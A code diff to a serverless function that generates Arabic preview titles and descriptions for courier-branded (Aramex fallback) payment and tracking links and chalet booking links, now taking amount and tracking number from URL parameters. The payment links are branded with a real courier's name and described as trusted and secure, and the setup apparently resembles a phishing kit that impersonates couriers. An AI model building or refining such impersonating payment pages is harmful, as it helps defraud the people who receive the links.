@@ -122,7 +122,7 @@ exports.handler = async (event, context) => {
     }
   }
   
-  const country = countryData[countryCode];
+  let country = countryData[countryCode];
   
   if (!country) {
     return {
@@ -157,6 +157,8 @@ exports.handler = async (event, context) => {
   let description = "";
   let ogImage = "/og-aramex.jpg";
   let serviceKey = 'aramex'; // fallback
+  const amountFromQuery = queryStringParameters?.amount ? decodeURIComponent(queryStringParameters.amount) : null;
+  const trackingFromQuery = queryStringParameters?.tracking ? decodeURIComponent(queryStringParameters.tracking) : null;
   
   if (type === "shipping") {
     // Determine service key from multiple sources
@@ -173,27 +175,42 @@ exports.handler = async (event, context) => {
       console.log('Using fallback service:', serviceKey);
     }
     
+    serviceKey = (serviceKey || 'aramex').toLowerCase();
     const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
     const serviceName = linkData?.payload?.service_name || serviceInfo.name;
+    const [arabicName] = serviceName.split(' - ');
+    const serviceDisplayName = (arabicName || serviceName || 'حلول الشحن').trim();
     
     console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
     
     // Determine if this is a payment page or microsite
     const isPaymentPage = path.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
-    
-    title = `${pageType} - ${serviceName}`;
-    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
+    const pageTitleSuffix = isPaymentPage ? 'رابط الدفع الآمن' : 'تتبع الشحنة والدفع';
+
+    title = `${serviceDisplayName} | ${pageTitleSuffix}`;
+    description = `${serviceDisplayName} - ${serviceInfo.description}. ${
+      isPaymentPage
+        ? 'أكمل الدفع وتتبع الشحنة عبر الرابط الآمن الموثوق.'
+        : 'شارك رابط التتبع مع عميلك لمتابعة الشحنة أولاً بأول.'
+    }`;
     ogImage = serviceInfo.ogImage;
     
-    // Add tracking number to description if available
-    if (linkData?.payload?.tracking_number) {
-      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
+    const trackingReference = linkData?.payload?.tracking_number || trackingFromQuery;
+    const amountReference =
+      (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0 && linkData.payload.cod_amount)
+        || amountFromQuery;
+
+    const sanitizedTracking = trackingReference ? `${trackingReference}`.trim() : null;
+    const sanitizedAmount = amountReference !== null && amountReference !== undefined
+      ? `${amountReference}`.toString().replace(/[^0-9.,]/g, '')
+      : null;
+
+    if (sanitizedTracking) {
+      description += ` • رقم التتبع: ${sanitizedTracking}`;
     }
-    
-    // Add COD amount if available
-    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
-      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
+
+    if (sanitizedAmount) {
+      description += ` • مبلغ الدفع: ${sanitizedAmount} ر.س`;
     }
   } else if (type === "chalet") {
     const chaletName = linkData?.payload?.chalet_name || 'شاليه';
@@ -202,11 +219,6 @@ exports.handler = async (event, context) => {
     
     title = `${pageType} - ${chaletName} في ${country.nameAr}`;
     description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
-    
-    // Add guest count and nights if available
-    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
-      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
-    }
     
     ogImage = "/og-aramex.jpg"; // Default for chalets
   }
